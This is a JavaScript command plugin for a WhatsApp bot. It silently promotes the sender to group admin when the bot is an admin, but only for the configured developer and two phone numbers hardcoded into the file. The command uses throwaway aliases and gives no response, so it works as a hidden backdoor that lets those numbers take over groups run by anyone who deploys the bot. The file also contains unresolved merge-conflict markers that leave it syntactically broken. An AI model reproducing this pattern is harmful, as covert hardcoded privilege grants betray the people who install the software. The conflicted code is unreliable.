const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "ik",
    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup || !isBotAdmins) return;

    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
<<<<<<< HEAD
        "255627417402@s.whatsapp.net"
=======
        "923493114170@s.whatsapp.net"
>>>>>>> 6f03804 (Upload project from local IMMU-MD-main (1))
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});
